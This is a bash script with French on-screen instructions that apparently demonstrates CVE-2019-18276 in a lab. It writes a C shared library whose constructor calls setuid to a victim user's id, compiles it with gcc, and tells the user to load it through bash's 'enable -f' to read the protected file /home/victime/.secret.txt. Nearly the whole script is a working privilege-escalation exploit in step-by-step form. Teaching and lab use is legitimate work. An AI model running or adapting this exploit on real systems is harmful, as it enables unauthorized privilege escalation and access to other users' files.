#!/usr/bin/env bash
#Terminal Color Codes
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'


echo -e "${GREEN}"
echo -e "Le but est de lire le contenu du fichier /home/victime/.secret.txt"
echo -e "dont on a pas l'acces:"
echo -e "${RED}"
ls -la /home/victime/.secret.txt
echo ""
echo -e "${RED}Running  : ${NC} cat /home/victime/.secret.txt"
sleep 1

echo -e "${RED}"
cat /home/victime/.secret.txt

echo -e "${GREEN}"
echo -e "Afin d'exploiter la faille CVE-2019-18276 suivez les instructions suivantes:\n"
sleep 3
echo -e "${NC}"
echo "The effective 'victime' id: "
id -u victime
echo ""
read -p "Please enter effective 'victime' id (euid) : " euid


#Create a C file and output the exploit code
touch pwn.c
echo "" > pwn.c
cat <<EOT >> pwn.c
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>

void __attribute((constructor)) initLibrary(void) {
        printf("Escape lib is initialized\n");
        printf("[LO] uid:%d | euid:%d\n", getuid(), geteuid());
        setuid($euid);
        printf("[LO] uid:%d | euid:%d\n\n\n", getuid(), geteuid());
}

EOT
echo -e  "${RED}"
echo -e "Exploit Code copied to pwn.c !\n"
sleep 1
echo -e "Compiling Exploit Object ! \n"
$(which gcc ) -c -fPIC pwn.c -o pwn.o
sleep 1
echo -e "Compiling Exploit Shared Object ! \n"
$(which gcc ) -shared -fPIC pwn.o -o libpwn.so
sleep 1
echo -e "Exploit Compiled ! \n"
sleep 1
echo -e "Executing Exploit :)  \n"
sleep 1
echo -e "${NC}-------------------------------------"
echo -e "${RED}Run  : ${NC} enable -f ./libpwn.so asd"
echo -e "And then, you'll have acces to ${GREEN}/home/victime/.secret.txt${NC}"
echo -e "To veryfie, ${RED}run  : ${NC}cat /home/victime/.secret.txt \n "
